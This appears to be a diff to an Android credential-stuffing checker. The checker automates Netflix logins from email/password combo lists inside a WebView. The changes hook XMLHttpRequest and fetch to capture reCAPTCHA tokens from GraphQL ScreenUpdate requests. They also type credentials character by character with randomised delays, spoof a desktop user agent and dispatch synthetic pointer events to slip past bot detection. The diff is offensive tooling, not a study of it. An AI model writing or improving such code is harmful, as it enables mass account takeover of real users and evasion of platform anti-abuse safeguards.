@@ -543,6 +543,7 @@ stats.cpm = stats.computeCpm()
                 var fillInjectedAt = startedAt
                 var fillCount = 0
                 var submittedAt = 0L
+                var lastTokLogged = ""
 
                 fun settle(acc: Account) {
                     if (settled) return
@@ -565,7 +566,7 @@ stats.cpm = stats.computeCpm()
 
                 fun pollResult() {
                     if (settled) return
-                    val js = """(function(){var u=location.href;var tt=document.title||'';var b='';try{b=document.body?document.body.innerText||'':'';}catch(x){}var t=b.slice(-1200).replace(/\s+/g,' ');var err=!!(document.querySelector('[data-uia="alert-error"]')||document.querySelector('[data-uia="field-error"]')||document.querySelector('.hasError'));var cap=!!document.querySelector('iframe[src*="recaptcha"]');return JSON.stringify({u:u,tt:tt,t:t,err:err,cap:cap,fs:(window.__silverbullet||'')});})()"""
+                    val js = """(function(){var u=location.href;var tt=document.title||'';var b='';try{b=document.body?document.body.innerText||'':'';}catch(x){}var t=b.slice(-1200).replace(/\s+/g,' ');var err=!!(document.querySelector('[data-uia="alert-error"]')||document.querySelector('[data-uia="field-error"]')||document.querySelector('.hasError'));var cap=!!document.querySelector('iframe[src*="recaptcha"]');var sb='';try{sb=window.__sb_screen_body||'';}catch(e){}var fs=(window.__silverbullet||'');return JSON.stringify({u:u,tt:tt,t:t,err:err,cap:cap,fs:fs,sb:sb});})()"""
                     wv.evaluateJavascript(js) { raw ->
                         if (settled) return@evaluateJavascript
                         val data = try {
@@ -580,6 +581,12 @@ stats.cpm = stats.computeCpm()
                         val snippet = (data?.optString("t", "") ?: "").take(140)
                         val elapsed = System.currentTimeMillis() - startedAt
                         val bodyText = (data?.optString("t", "") ?: "").lowercase()
+                        val sb = data?.optString("sb", "") ?: ""
+                        val tok = sb.contains("\"recaptchaResponseToken\":\"") && !sb.contains("\"recaptchaResponseToken\":\"\"")
+                        if (sb.isNotEmpty() && lastTokLogged != "$tok") {
+                            lastTokLogged = "$tok"
+                            log("Netflix(browser): GraphQL ScreenUpdate captured, recaptchaTokenPresent=$tok len=${sb.length}")
+                        }
 
                         val stateKey = "u=$url|fs=$fs|err=$err"
                         if (stateKey != lastLogState) {
@@ -644,6 +651,18 @@ stats.cpm = stats.computeCpm()
                     wv.settings.userAgentString =
                         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
                     wv.webViewClient = object : WebViewClient() {
+                        override fun onPageStarted(view: WebView?, url: String?) {
+                            if (settled) return
+                            val hookJs = "(function(){if(window.__sb_hooked)return;window.__sb_hooked=true;" +
+                                "var o=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(b){" +
+                                "try{if(typeof b==='string'&&b.indexOf('CLCSScreenUpdate')>-1){window.__sb_screen_body=b;}}catch(e){}" +
+                                "return o.apply(this,arguments);};" +
+                                "var f=window.fetch;window.fetch=function(){" +
+                                "try{var a=arguments;var body=a[1]&&a[1].body;if(typeof body==='string'&&body.indexOf('CLCSScreenUpdate')>-1){window.__sb_screen_body=body;}}catch(e){}" +
+                                "return f.apply(this,arguments);};})()"
+                            view?.evaluateJavascript(hookJs, null)
+                        }
+
                         override fun shouldOverrideUrlLoading(view: WebView?, request: android.webkit.WebResourceRequest?): Boolean {
                             if (!settled) log("Netflix(browser): nav=${request?.url}")
                             return false
@@ -683,20 +702,23 @@ stats.cpm = stats.computeCpm()
         val pass = JSONObject.quote(combo.password)
         val js = """(function(){
 try{
-var EMAIL=%EMAIL%;var PASS=%PASS%;
-function sv(el,v){var s=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;s.call(el,v);el.dispatchEvent(new Event('input',{bubbles:true}));el.dispatchEvent(new Event('change',{bubbles:true}));}
-var tries=0;
-var t=setInterval(function(){tries++;
-var u=document.querySelector('#id_userLoginId')||document.querySelector('input[name="userLoginId"]')||document.querySelector('input[type="email"]');
-var p=document.querySelector('#id_password')||document.querySelector('input[type="password"]');
-if(!u||!p){window.__silverbullet='no_fields';if(tries>48)clearInterval(t);return;}
-if(document.querySelector('[data-uia="alert-error"],[data-uia="field-error"],.hasError')){window.__silverbullet='error_visible';clearInterval(t);return;}
-if(u.value&&p.value&&window.__silverbullet==='submitted')return;
+var EMAIL=%EMAIL%;var PASS=%PASS%;var started=false;
+function setVal(el,v){var s=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;s.call(el,v);el.dispatchEvent(new Event('input',{bubbles:true}));}
+function typeText(el,text,done){var i=0;var t=setInterval(function(){if(i>=text.length){clearInterval(t);el.dispatchEvent(new Event('change',{bubbles:true}));done();return;}i++;setVal(el,text.slice(0,i));el.dispatchEvent(new Event('keyup',{bubbles:true}));},55+Math.floor(Math.random()*45));}
+function fields(){var u=document.querySelector('#id_userLoginId')||document.querySelector('input[name="userLoginId"]')||document.querySelector('input[type="email"]');var p=document.querySelector('#id_password')||document.querySelector('input[type="password"]');return (u&&p)?{u:u,p:p}:null;}
+function clickBtn(){var b=document.querySelector('[data-uia="login-submit-button"]')||document.querySelector('button[type="submit"]')||document.querySelector('[data-uia="primary-action"]');if(!b){window.__silverbullet='no_button';return;}try{window.scrollTo(0,window.innerHeight*0.3);window.scrollTo(0,0);}catch(e){}
+['pointerdown','mousedown','pointerup','mouseup','click'].forEach(function(t){b.dispatchEvent(new MouseEvent(t,{bubbles:true,cancelable:true,view:window}));});
+window.__silverbullet='submitted';}
+function waitCap(){var n=0;var t=setInterval(function(){n++;if(window.grecaptcha||document.querySelector('iframe[src*="recaptcha"]')||n>55){clearInterval(t);setTimeout(clickBtn,350+Math.floor(Math.random()*400));}},200);}
+function go(){var f=fields();if(!f){window.__silverbullet='no_fields';return;}
+if(f.u.value&&f.p.value){waitCap();return;}
 window.__silverbullet='fields_found';
-sv(u,EMAIL);sv(p,PASS);
-var b=document.querySelector('[data-uia="login-submit-button"]')||document.querySelector('button[type="submit"]')||document.querySelector('[data-uia="primary-action"]');
-if(b){window.__silverbullet='submitting';clearInterval(t);setTimeout(function(){b.click();window.__silverbullet='submitted';},250);}
+typeText(f.u,EMAIL,function(){typeText(f.p,PASS,function(){waitCap();});});}
+var w=setInterval(function(){
+if(document.querySelector('[data-uia="alert-error"],[data-uia="field-error"],.hasError')){window.__silverbullet='error_visible';clearInterval(w);return;}
+if(!started&&fields()){started=true;clearInterval(w);go();}
 },250);
+setTimeout(function(){if(!started){window.__silverbullet='no_fields';}},15000);
 }catch(e){window.__silverbullet='fill_js_err';}
 })()"""
         view.evaluateJavascript(
